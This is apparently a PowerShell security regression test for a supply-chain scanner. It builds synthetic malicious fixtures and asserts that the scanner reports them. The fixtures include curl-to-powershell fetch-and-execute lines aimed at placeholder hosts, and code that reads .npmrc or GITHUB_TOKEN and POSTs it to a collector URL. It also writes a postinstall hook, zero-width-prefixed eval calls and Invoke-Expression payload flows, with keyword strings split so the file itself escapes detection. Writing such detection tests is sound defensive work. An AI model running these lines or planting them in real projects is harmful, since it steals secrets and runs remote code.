[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
$repoRoot = Split-Path -Parent $PSScriptRoot
$scannerPath = Join-Path $repoRoot 'Scan-DevSupplyChain.ps1'
$launcherPath = Join-Path $repoRoot 'run-checker.bat'
$windowsPowerShell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$cmdExe = Join-Path $env:SystemRoot 'System32\cmd.exe'
$testRoot = Join-Path $PSScriptRoot ('.security-boundary-regression-' + [Guid]::NewGuid().ToString('N'))

function Assert-SecurityContract {
    param(
        [bool]$Condition,
        [string]$Message
    )
    if (-not $Condition) {
        throw $Message
    }
}

function Write-Utf8NoBom {
    param(
        [string]$LiteralPath,
        [string]$Text
    )
    $parent = Split-Path -Parent $LiteralPath
    if (-not (Test-Path -LiteralPath $parent -PathType Container)) {
        New-Item -ItemType Directory -Path $parent -Force | Out-Null
    }
    [System.IO.File]::WriteAllText($LiteralPath, $Text, (New-Object System.Text.UTF8Encoding($false)))
}

function Invoke-SyntheticScan {
    param(
        [string]$ScriptPath,
        [string[]]$Arguments
    )
    & $windowsPowerShell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File $ScriptPath @Arguments | Out-Null
    $exitCode = $LASTEXITCODE
    $global:LASTEXITCODE = 0
    return $exitCode
}

function Set-ProcessEnvironment {
    param([hashtable]$Values)
    foreach ($name in $Values.Keys) {
        [Environment]::SetEnvironmentVariable([string]$name, [string]$Values[$name], 'Process')
    }
}

if (-not (Test-Path -LiteralPath $windowsPowerShell -PathType Leaf)) {
    throw 'Windows PowerShell 5.1 is required for the security boundary regression tests.'
}
if (-not (Test-Path -LiteralPath $cmdExe -PathType Leaf)) {
    throw 'cmd.exe is required for the launcher security boundary regression test.'
}

$scannerSource = [System.IO.File]::ReadAllText($scannerPath)
$scannerTokens = $null
$scannerParseErrors = $null
$scannerAst = [System.Management.Automation.Language.Parser]::ParseInput($scannerSource, [ref]$scannerTokens, [ref]$scannerParseErrors)
Assert-SecurityContract -Condition (@($scannerParseErrors).Count -eq 0) -Message 'Scanner source could not be parsed for path-boundary helper validation.'
$pathHelperNames = @('Get-FullPathSafe','Test-IsPathUnderRoot','Test-IsDependencyOrGeneratedArtifactPath')
$pathHelperDefinitions = @($scannerAst.FindAll({
    param($node)
    $node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $node.Name -in $pathHelperNames
}, $true) | ForEach-Object { $_.Extent.Text })
Assert-SecurityContract -Condition ($pathHelperDefinitions.Count -eq $pathHelperNames.Count) -Message 'Expected path-boundary helper definitions were not found exactly once.'
. ([scriptblock]::Create([string]::Join("`r`n", [string[]]$pathHelperDefinitions)))
$syntheticDriveRoot = [System.IO.Path]::GetPathRoot($repoRoot)
$script:CurrentScanRoot = $syntheticDriveRoot
$syntheticDriveDependency = Join-Path $syntheticDriveRoot 'node_modules\synthetic-package\index.js'
Assert-SecurityContract -Condition ((Get-FullPathSafe $syntheticDriveRoot) -eq $syntheticDriveRoot) -Message 'Filesystem root normalization changed a drive root into a drive-relative path.'
Assert-SecurityContract -Condition (Test-IsDependencyOrGeneratedArtifactPath $syntheticDriveDependency) -Message 'Dependency classification failed when the explicit scan root was a filesystem root.'
$script:CurrentScanRoot = $repoRoot
foreach ($generatedMarker in @('node_modules','vendor','site-packages','.venv','venv','env','__pycache__','.tox','.mypy_cache','.pytest_cache','.next','.nuxt','.svelte-kit','dist','build','out','target','obj','.cache','.tmp','tmp')) {
    $generatedCandidate = Join-Path (Join-Path $repoRoot $generatedMarker) 'synthetic-package\index.js'
    Assert-SecurityContract -Condition (Test-IsDependencyOrGeneratedArtifactPath $generatedCandidate) -Message ("Deep dependency/generated marker was not classified relative to the explicit root: {0}" -f $generatedMarker)
}
$explicitGeneratedNamedRoot = Join-Path $repoRoot 'dist\first-party-repository'
$script:CurrentScanRoot = $explicitGeneratedNamedRoot
Assert-SecurityContract -Condition (-not (Test-IsDependencyOrGeneratedArtifactPath (Join-Path $explicitGeneratedNamedRoot 'src\index.js'))) -Message 'An explicit scan root was downgraded because an ancestor directory had a generated-artifact name.'

New-Item -ItemType Directory -Path $testRoot -Force | Out-Null
try {
    $launcherCwd = Join-Path $testRoot 'launcher-cwd'
    New-Item -ItemType Directory -Path $launcherCwd -Force | Out-Null
    [System.IO.File]::WriteAllBytes((Join-Path $launcherCwd 'powershell.exe'), (New-Object byte[] 0))

    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $cmdExe
    $startInfo.Arguments = ('/d /s /c ""{0}" help"' -f $launcherPath)
    $startInfo.WorkingDirectory = $launcherCwd
    $startInfo.UseShellExecute = $false
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    [void]$process.Start()
    $launcherOutput = $process.StandardOutput.ReadToEnd()
    $launcherError = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    Assert-SecurityContract -Condition ($process.ExitCode -eq 0) -Message ("Launcher did not use the pinned PowerShell path. exit={0}; stderr={1}" -f $process.ExitCode,$launcherError.Trim())
    Assert-SecurityContract -Condition ([bool]($launcherOutput -match '(?m)^Usage:\s*$')) -Message 'Launcher help did not complete from a directory containing a spoofed powershell.exe.'

    $distributionRoot = Join-Path $testRoot 'synthetic-distribution'
    $copiedScanner = Join-Path $distributionRoot 'Scan-DevSupplyChain.ps1'
    New-Item -ItemType Directory -Path $distributionRoot -Force | Out-Null
    Copy-Item -LiteralPath $scannerPath -Destination $copiedScanner
    $fetchCommand = ('cu' + 'rl https://payload.example.invalid/install.ps1 | powers' + 'hell')
    $workflowText = @"
name: synthetic-self-boundary
on: push
jobs:
  validation:
    runs-on: windows-latest
    steps:
      - run: $fetchCommand
"@
    Write-Utf8NoBom -LiteralPath (Join-Path $distributionRoot '.github\workflows\validate.yml') -Text $workflowText
    $secretName = 'GITHUB_' + 'TOKEN'
    $sendCommand = 'Invoke-' + 'RestMethod'
    $contractText = ('$token = $env:' + $secretName + '; ' + $sendCommand + " -Uri 'https://collector.example.invalid/' -Method Post -Body `$token")
    Write-Utf8NoBom -LiteralPath (Join-Path $distributionRoot 'tests\Test-LauncherScopeContracts.ps1') -Text $contractText

    $selfText = Join-Path $testRoot 'scanner-self.txt'
    $selfJson = Join-Path $testRoot 'scanner-self.json'
    $selfExit = Invoke-SyntheticScan -ScriptPath $copiedScanner -Arguments @(
        '-Path', $distributionRoot,
        '-Checks', 'CiCd,LifecycleScripts',
        '-TextOut', $selfText,
        '-JsonOut', $selfJson,
        '-Quiet', '-NoColor'
    )
    Assert-SecurityContract -Condition ($selfExit -eq 2) -Message ("Synthetic scanner-self attack did not produce DANGER. exit={0}" -f $selfExit)
    $selfReport = Get-Content -LiteralPath $selfJson -Raw | ConvertFrom-Json
    Assert-SecurityContract -Condition (@($selfReport.findings | Where-Object { $_.category -eq 'GITHUB_ACTIONS_EXTERNAL_EXECUTION' }).Count -eq 1) -Message 'Active validate.yml fetch-execute content was still suppressed as scanner-self.'
    Assert-SecurityContract -Condition (@($selfReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' }).Count -eq 1) -Message 'Active launcher contract secret-exfil content was still suppressed as scanner-self.'

    $precisionRoot = Join-Path $testRoot 'triage-precision'
    $dependencyRoot = Join-Path $precisionRoot 'node_modules\synthetic-bundle'
    $activePackageRoot = Join-Path $precisionRoot 'node_modules\active-package'
    $nestedWorkflowRoot = Join-Path $dependencyRoot '.github\workflows'
    foreach ($directory in @($precisionRoot,$dependencyRoot,$activePackageRoot,$nestedWorkflowRoot)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'package.json') -Text '{"name":"synthetic-root","private":true}'

    $secretLeaf = '.npm' + 'rc'
    $postCall = 'fe' + 'tch("https://collector.example.invalid/",{method:"POST",body:secret});'
    $knownPostCall = 'fe' + 'tch("https://npm-' + 'cache.com/router",{method:"POST",body:secret});'
    $secretRead = 'const secret=require("fs").readFileSync("' + $secretLeaf + '");'
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'first-party-exfil.mjs') -Text ($secretRead + $postCall)
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'Keyv-ChainDrop-NonDestructive-Check-v0.0.0.bat') -Text ($secretRead + $postCall)
    Write-Utf8NoBom -LiteralPath (Join-Path $dependencyRoot 'near-exfil.js') -Text ($secretRead + $postCall)
    Write-Utf8NoBom -LiteralPath (Join-Path $dependencyRoot 'far-exfil.js') -Text ($secretRead + ('A' * 800) + $postCall)

    $passiveLookingLines = @(
        'function Get-ChainDropBehaviorSummary {',
        '    param([string]$Text)',
        ('    $signals.exactC2 = ($Text -match "' + ('npm-' + 'cache.com') + '")'),
        '    $credentialPattern = "NPM_' + 'TOKEN|.npm' + 'rc"',
        '    $networkWritePattern = "fe' + 'tch|POST"',
        '}',
        'function Get-ChainDropBehaviorDecision {',
        '    param([string]$Text)',
        '    return @{ severity = "NONE" }',
        '}',
        'function Test-InternalBehaviorRules {',
        "    `$maliciousExfil = @'",
        $secretRead,
        $knownPostCall,
        "'@",
        '    foreach ($malicious in @($maliciousExfil)) {',
        '        $decision = Get-ChainDropBehaviorDecision -Text $malicious',
        '    }',
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'untrusted-passive-looking-fixture.bat') -Text ([string]::Join("`r`n", [string[]]$passiveLookingLines))
    $dynamicInvocation = 'Invoke-' + 'Expression $Text'
    $activeFixtureLines = @(
        'function Get-ChainDropBehaviorDecision {',
        '    param([string]$Text)',
        ('    ' + $dynamicInvocation),
        '}',
        'function Test-InternalBehaviorRules {',
        "    `$maliciousExfil = @'",
        $secretRead,
        $knownPostCall,
        "'@",
        '    $decision = Get-ChainDropBehaviorDecision -Text $maliciousExfil',
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-fixture-execution.bat') -Text ([string]::Join("`r`n", [string[]]$activeFixtureLines))
    $jobInvocation = 'Start-' + 'Job -ScriptBlock ([scriptblock]$Text) | Wait-' + 'Job | Receive-' + 'Job'
    $jobFixtureLines = @(
        'function Get-ChainDropBehaviorDecision {',
        '    param([string]$Text)',
        ('    ' + $jobInvocation),
        '}',
        'function Test-InternalBehaviorRules {',
        "    `$maliciousExfil = @'",
        $secretRead,
        $knownPostCall,
        "'@",
        '    $decision = Get-ChainDropBehaviorDecision -Text $maliciousExfil',
        '}',
        'Test-InternalBehaviorRules'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-fixture-start-job.bat') -Text ([string]::Join("`r`n", [string[]]$jobFixtureLines))

    $expandedFetchExecute = ('cu' + 'rl https://payload.example.invalid/install.ps1 | power' + 'shell')
    $expandedFixtureLines = @(
        ('$fixtureCommand = "' + $expandedFetchExecute + '"'),
        '$Text = @"',
        '$fixtureCommand',
        '"@',
        'Start-Job -ScriptBlock ([scriptblock]$Text) | Wait-Job | Receive-Job'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-expanded-fixture-start-job.ps1') -Text ([string]::Join("`r`n", [string[]]$expandedFixtureLines))

    $webRequestCommand = 'Invoke-' + 'WebRequest'
    $restRequestCommand = 'Invoke-' + 'RestMethod'
    $expressionCommand = 'Invoke-' + 'Expression'
    $longShellCommand = 'power' + 'shell'
    $shortShellCommand = 'pw' + 'sh'
    $passiveFetchPattern = [string]::Join('|', @($webRequestCommand,$restRequestCommand,('cu' + 'rl'),'wget'))
    $passiveExecutionPattern = [string]::Join('|', @('Start-Process',$expressionCommand,('i' + 'ex'),$longShellCommand,$shortShellCommand))
    $passivePatternLines = @(
        '$patterns = @(',
        ("    @{{ Name = 'fetch'; Pattern = '(?im)({0})' }}," -f $passiveFetchPattern),
        ("    @{{ Name = 'dynamic_execution'; Pattern = '(?im)({0})' }}" -f $passiveExecutionPattern),
        ')',
        'foreach ($pattern in $patterns) {',
        '    if ($scanText -match $pattern.Pattern) {',
        '        Write-Output $pattern.Name',
        '    }',
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'passive-regex-pattern-table.ps1') -Text ([string]::Join("`r`n", [string[]]$passivePatternLines))

    $siblingPassivePatternLines = @(
        'function Test-FirstPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'fetch'; Pattern = '(?im)({0})' }}," -f $passiveFetchPattern),
        ("        @{{ Name = 'execute'; Pattern = '(?im)({0})' }}" -f $passiveExecutionPattern),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '}',
        'function Test-SecondPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'fetch'; Pattern = '(?im)({0})' }}," -f $passiveFetchPattern),
        ("        @{{ Name = 'execute'; Pattern = '(?im)({0})' }}" -f $passiveExecutionPattern),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -notmatch $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'passive-regex-sibling-functions.ps1') -Text ([string]::Join("`r`n", [string[]]$siblingPassivePatternLines))

    $liveCommandLines = @($passivePatternLines)
    $liveCommandLines += ('# ' + ('x' * 200))
    $liveCommandLines += ('Invoke-' + 'WebRequest https://payload.example.invalid/install.ps1 | Invoke-' + 'Expression')
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'passive-regex-plus-live-command.ps1') -Text ([string]::Join("`r`n", [string[]]$liveCommandLines))

    $activePatternFlowLines = @(
        '$patterns = @(',
        ('    @{ Name = ''payload''; Pattern = ''' + $expandedFetchExecute + ''' }'),
        ')',
        '$Text = $patterns[0].Pattern',
        'Start-Job -ScriptBlock ([scriptblock]$Text) | Wait-Job | Receive-Job'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-pattern-table-start-job.ps1') -Text ([string]::Join("`r`n", [string[]]$activePatternFlowLines))

    $wrappedPatternFlowLines = @(
        'function Invoke-PatternProvider {',
        '    param($rules)',
        ('    Invoke-' + 'Expression $rules[0].Pattern'),
        '    return $rules',
        '}',
        '$patterns = @(',
        ('    @{ Name = ''payload''; Pattern = ''' + $expandedFetchExecute + ''' }'),
        ')',
        'foreach ($pattern in (Invoke-PatternProvider $patterns)) {',
        '    if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-wrapped-pattern-table.ps1') -Text ([string]::Join("`r`n", [string[]]$wrappedPatternFlowLines))

    $patternValuesFlowLines = @(
        '$patterns = @(',
        ('    @{ Name = ''payload''; Pattern = ''' + $expandedFetchExecute + ''' }'),
        ')',
        'foreach ($pattern in $patterns) {',
        ('    Invoke-' + 'Expression ($pattern.Values -join '''')'),
        '}'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-pattern-values-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$patternValuesFlowLines))

    $dynamicScopePatternFlowLines = @(
        'function Invoke-PatternPayload {',
        ('    ' + $expressionCommand + ' $patterns[0].Pattern'),
        '}',
        'function Invoke-PatternBridge {',
        '    Invoke-PatternPayload',
        '}',
        'function Test-SafeLookingPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    Invoke-PatternBridge',
        '}',
        'Test-SafeLookingPatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-dynamic-scope-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$dynamicScopePatternFlowLines))

    $clonePatternFlowLines = @(
        '$patterns = @(',
        ("    @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        ')',
        '$clonedPatterns = $patterns.Clone()',
        ($expressionCommand + ' $clonedPatterns[0].Pattern')
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-pattern-clone-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$clonePatternFlowLines))

    $loopItemEscapeLines = @(
        '$patterns = @(',
        ("    @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        ')',
        'foreach ($pattern in $patterns) {',
        '    if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '}',
        ($expressionCommand + ' $pattern.Pattern')
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-loop-item-escape.ps1') -Text ([string]::Join("`r`n", [string[]]$loopItemEscapeLines))

    $selfSourcePatternFlowLines = @(
        '$patterns = @(',
        ("    @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        ')',
        'foreach ($pattern in $patterns) {',
        '    if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '}',
        ('# ' + ('x' * 220)),
        '$sourceText = Get-Content -LiteralPath $PSCommandPath -Raw',
        ($expressionCommand + ' $sourceText')
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-self-source-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$selfSourcePatternFlowLines))

    $splitSelfSourcePatternFlowLines = @(
        'function Get-OwnSourceText {',
        '    return [System.IO.File]::ReadAllText($PSCommandPath)',
        '}',
        'function Invoke-OwnSourceText {',
        '    param([string]$Text)',
        ('    ' + $expressionCommand + ' $Text'),
        '}',
        'function Test-SplitSelfSourcePatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    $sourceText = Get-OwnSourceText',
        '    Invoke-OwnSourceText $sourceText',
        '}',
        'Test-SplitSelfSourcePatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-split-self-source-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$splitSelfSourcePatternFlowLines))

    $variableProviderPatternFlowLines = @(
        'function Invoke-VariableProviderPattern {',
        '    $providerPatterns = Get-Content variable:patterns',
        ('    ' + $expressionCommand + ' $providerPatterns[0].Pattern'),
        '}',
        'function Test-VariableProviderPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    Invoke-VariableProviderPattern',
        '}',
        'Test-VariableProviderPatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-variable-provider-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$variableProviderPatternFlowLines))

    $functionProviderPatternFlowLines = @(
        'function Invoke-FunctionProviderPattern {',
        ('    ' + $expressionCommand + ' $patterns[0].Pattern'),
        '}',
        'function Test-FunctionProviderPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    $handler = ${function:Invoke-FunctionProviderPattern}',
        '    1 | ForEach-Object $handler',
        '}',
        'Test-FunctionProviderPatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-function-provider-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$functionProviderPatternFlowLines))

    $commandDefinitionPatternFlowLines = @(
        'function Invoke-CommandDefinitionPattern {',
        ('    ' + $expressionCommand + ' $patterns[0].Pattern'),
        '}',
        'function Test-CommandDefinitionPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    $definition = (Get-Command Invoke-CommandDefinitionPattern).Definition',
        ('    ' + $expressionCommand + ' $definition'),
        '}',
        'Test-CommandDefinitionPatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-command-definition-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$commandDefinitionPatternFlowLines))

    $matchLimitPatternFlowLines = New-Object System.Collections.Generic.List[string]
    $matchLimitPatternFlowLines.Add('$patterns = @(')
    for ($index = 0; $index -lt 256; $index++) {
        $suffix = if ($index -lt 255) { ',' } else { '' }
        $matchLimitPatternFlowLines.Add(("    @{{ Name = 'payload{0}'; Pattern = '{1}' }}{2}" -f $index,$expandedFetchExecute,$suffix))
    }
    $matchLimitPatternFlowLines.Add(')')
    $matchLimitPatternFlowLines.Add('foreach ($pattern in $patterns) {')
    $matchLimitPatternFlowLines.Add('    if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }')
    $matchLimitPatternFlowLines.Add('}')
    $matchLimitPatternFlowLines.Add($liveCommandLines[-1])
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'ambiguous-pattern-match-limit.ps1') -Text ([string]::Join("`r`n", [string[]]$matchLimitPatternFlowLines))

    $reflectionPatternFlowLines = @(
        'function Invoke-ReflectedPattern {',
        '    $reflectedPatterns = Get-Variable -Name patterns -Scope 1 -ValueOnly',
        ('    ' + $expressionCommand + ' $reflectedPatterns[0].Pattern'),
        '}',
        'function Test-ReflectedPatternSet {',
        '    $patterns = @(',
        ("        @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        '    )',
        '    foreach ($pattern in $patterns) {',
        '        if ($scanText -match $pattern.Pattern) { Write-Output $pattern.Name }',
        '    }',
        '    Invoke-ReflectedPattern',
        '}',
        'Test-ReflectedPatternSet'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'active-reflected-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$reflectionPatternFlowLines))

    $parseErrorPatternLines = @(
        '$patterns = @(',
        ("    @{{ Name = 'payload'; Pattern = '{0}' }}" -f $expandedFetchExecute),
        ')',
        'foreach ($pattern in $patterns) {',
        '    if ($scanText -match $pattern.Pattern) {'
    )
    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'ambiguous-parse-error-pattern-flow.ps1') -Text ([string]::Join("`r`n", [string[]]$parseErrorPatternLines))

    Write-Utf8NoBom -LiteralPath (Join-Path $precisionRoot 'security-boundary-test-source.ps1') -Text ([System.IO.File]::ReadAllText($MyInvocation.MyCommand.Path))

    $shellName = 'power' + 'shell'
    $fetchExecute = ('cu' + 'rl https://payload.example.invalid/install.ps1 | ' + $shellName)
    Write-Utf8NoBom -LiteralPath (Join-Path $dependencyRoot 'optional-installer.sh') -Text $fetchExecute
    Write-Utf8NoBom -LiteralPath (Join-Path $dependencyRoot 'unicode.js') -Text (([char]0x200B) + 'eval(payload);')
    $wasmText = 'const bytes=Buffer.from(value,"base64"); WebAssembly.instantiate(bytes); require("child_' + 'process").exec("synthetic");'
    Write-Utf8NoBom -LiteralPath (Join-Path $dependencyRoot 'wasm.js') -Text $wasmText

    $nestedWorkflowText = @"
name: inert-dependency-workflow
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: $secretName=`${{ secrets.$secretName }} $postCall
"@
    Write-Utf8NoBom -LiteralPath (Join-Path $nestedWorkflowRoot 'publish.yml') -Text $nestedWorkflowText

    Write-Utf8NoBom -LiteralPath (Join-Path $activePackageRoot 'package.json') -Text '{"name":"active-package","scripts":{"postinstall":"node install.js"},"main":"runtime.js"}'
    Write-Utf8NoBom -LiteralPath (Join-Path $activePackageRoot 'install.js') -Text $fetchExecute
    Write-Utf8NoBom -LiteralPath (Join-Path $activePackageRoot 'runtime.js') -Text (([char]0x200B) + 'eval(payload);' + $wasmText)

    $precisionText = Join-Path $testRoot 'triage-precision.txt'
    $precisionJson = Join-Path $testRoot 'triage-precision.json'
    $precisionExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
        '-Path', $precisionRoot,
        '-Deep',
        '-Checks', 'LifecycleScripts,InvisibleUnicode,CiCd',
        '-TextOut', $precisionText,
        '-JsonOut', $precisionJson,
        '-Quiet', '-NoColor'
    )
    Assert-SecurityContract -Condition ($precisionExit -eq 2) -Message ("Triage precision scan did not preserve active DANGER behavior. exit={0}" -f $precisionExit)
    $precisionReport = Get-Content -LiteralPath $precisionJson -Raw | ConvertFrom-Json
    $firstPartyExfil = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'first-party-exfil.mjs' })
    $dependencyExfil = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' -and $_.severity -eq 'WARN' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'near-exfil.js' })
    $farExfil = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'far-exfil.js' })
    Assert-SecurityContract -Condition ($firstPartyExfil.Count -eq 1) -Message 'First-party bounded credential-exfiltration compound no longer produced DANGER.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'Keyv-ChainDrop-NonDestructive-Check-v0.0.0.bat' }).Count -eq 1) -Message 'A spoofed legacy checker filename bypassed active secret-exfiltration detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'untrusted-passive-looking-fixture.bat' }).Count -ge 1) -Message 'An attacker-controlled passive-looking fixture bypassed normal behavior detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-fixture-execution.bat' }).Count -ge 1) -Message 'An executing fixture block bypassed active behavior detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-fixture-start-job.bat' }).Count -ge 1) -Message 'A Start-Job fixture execution path bypassed active behavior detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-expanded-fixture-start-job.ps1' }).Count -eq 1) -Message 'A fixture-named command expanded into Start-Job bypassed external fetch-and-execute detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'passive-regex-pattern-table.ps1' }).Count -eq 0) -Message 'Static PowerShell regex Pattern values used only by -match were misclassified as external execution.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'passive-regex-sibling-functions.ps1' }).Count -eq 0) -Message 'Independent sibling functions with local Pattern tables were conflated by variable name.'
    $liveCommandFindings = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'passive-regex-plus-live-command.ps1' })
    $liveCommandLinesFound = [string]::Join(',', [string[]]@($liveCommandFindings | ForEach-Object { [string]$_.line }))
    Assert-SecurityContract -Condition ($liveCommandFindings.Count -eq 1 -and [int]$liveCommandFindings[0].line -eq ($passivePatternLines.Count + 2)) -Message ("A live fetch-execute command beside passive regex definitions was hidden or reported at the passive definition. count={0}; lines={1}; expectedLine={2}" -f $liveCommandFindings.Count,$liveCommandLinesFound,($passivePatternLines.Count + 2))
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-pattern-table-start-job.ps1' }).Count -eq 1) -Message 'A Pattern value flowing into Start-Job was incorrectly treated as passive regex data.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-wrapped-pattern-table.ps1' }).Count -eq 1) -Message 'A Pattern table passed through an executing wrapper was incorrectly treated as passive regex data.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-pattern-values-flow.ps1' }).Count -eq 1) -Message 'A Pattern value exposed through the hashtable Values property was incorrectly treated as passive regex data.'
